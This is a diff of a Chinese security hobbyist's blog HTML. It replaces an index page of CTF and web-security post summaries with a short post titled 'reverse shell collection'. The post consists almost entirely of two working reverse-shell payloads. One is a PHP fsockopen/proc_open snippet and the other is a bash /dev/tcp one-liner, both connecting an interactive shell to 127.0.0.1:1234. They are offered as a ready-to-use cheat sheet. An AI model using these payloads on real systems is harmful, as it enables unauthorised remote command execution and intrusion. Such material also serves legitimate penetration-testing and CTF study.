@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>阿杰的小站</title>
+    <title>反弹shell合集 · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >阿杰的小站</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">反弹shell合集</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>阿杰的小站</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg3.jpeg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            阿杰的小站
-            <!-- 文章页  -->
+            反弹shell合集
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,49 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                冲冲冲.../成信大
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">52</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/24</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,267 +399,57 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/13/bugku代码审计wp/" >
-            
-                <span>bugku代码审计wp</span>
-        </a>
-        <div class="abstract-content">
-            0x01. extract变量覆盖1234567891011121314$flag=&apos;xxx&apos;;extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo&apos;flag&#123;xxx&#125;&apos;;&#125;else&#123;echo&apos;Oh.no&apos;;&#125;&#125;
-\$shiyan和$flag变量由extract变量覆盖进行控制$content变量由fil...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/21/PHP反序列化绕过__wakeup方法/" >
-            
-                <span>PHP反序列化绕过__wakeup方法</span>
-        </a>
-        <div class="abstract-content">
-            0x01.前言做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10
-0x02. public private protected的序列化12345678910111213class Kage&#123;	public $name=&apos;kxj&apos;;	private $name2=&apos;kxj&apos;;	protected $name3=&apos;kxj&apos;;	public function getName()&#123;		var_dump(...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/03/31/文件包含漏洞/" >
-            
-                <span>文件包含漏洞小结</span>
-        </a>
-        <div class="abstract-content">
-            原理如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见函数有：include()、require()区别：
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><p><code>&lt;?php $sock = fsockopen(&quot;127.0.0.1&quot;, 1234);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open(&quot;/bin/bash&quot;, $descriptorspec, $pipes);proc_close($process);</code></p>
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></p>
 
-include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
-require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
-
-require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件include_once()、require_once()与(include\require)的功能相同,只...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/31</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/03/同一台电脑连接多个github仓库/" >
-            
-                <span>同一台电脑连接多个github仓库</span>
-        </a>
-        <div class="abstract-content">
-            0x01.生成密钥1ssh-keygen -t rsa -C &quot;yourname@email.com&quot;
-分别生成两次公钥，可以得到两组公钥和私钥
-0x02. 在github上添加公钥不解释
-0x03. 添加config配置文件在.ssh文件夹下添加config文件1234567891011#第一个账号 Bu1uokageHost github.comHostName github.comUser gitIdentityFile ~/.ssh/id_rsa#第二个账号 K4geHost K4geHostName github.comUser gitIdentityFil...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/10/24/反弹shell合集/">http://yoursite.com/2019/10/24/反弹shell合集/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/10/24/反弹shell合集/">十月 24日 2019, 10:30:07 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/10/24/反弹shell合集/">October 24th 2019, 10:30:07 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/03/hgame草稿/" >
-            
-                <span>hgame-web-week1</span>
-        </a>
-        <div class="abstract-content">
-            1. 谁吃了我的flag获取vim备份文件vim自动退出会临时备份隐藏文件 .xxx.swp用linux打vim -r .xxx.swp 可以恢复备份文件hgame{3eek_diScl0Sure_fRom+wEbsit@}
-2. 换头大作战输入框输入，要求使用postpost输入要求使用waterfox，更改要求bilibili登录最后得到flaghgame{hTTp_HeaDeR_iS_Ez}
-3. very easy web1234567891011121314&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(s...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/page/4/">&#60; PREV</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
-    </nav>
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/Kage.jpg >
-    <div class="profile-name">部落阿杰</div>
-    
-    <div class="profile-signature">
-        苟有恒，何必三更眠五更起。
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/10/24/python编程总结/" title= "python编程总结">
+                    <div class="nextTitle">python编程总结</div>
+                </a>
             
-                <a href="mailto:543251348@qq.com" class="iconfont-archer email" title=email ></a>
+        </li>
+        <li class="previous">
             
-        
-    
-        
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/19/linux常用指令/" title= "linux常用指令">
+                    <div class="prevTitle">linux常用指令</div>
+                </a>
             
-                <a href="//github.com/K4ge" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
-            
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //www.baidu.com target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= //www.google.com target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -691,6 +529,24 @@ require一般是用于文件头包含类文件、数据库等等文件，include
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#php反弹shell"><span class="toc-number">1.</span> <span class="toc-text">php反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash反弹shell"><span class="toc-number">2.</span> <span class="toc-text">bash反弹shell</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1700,6 +1556,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
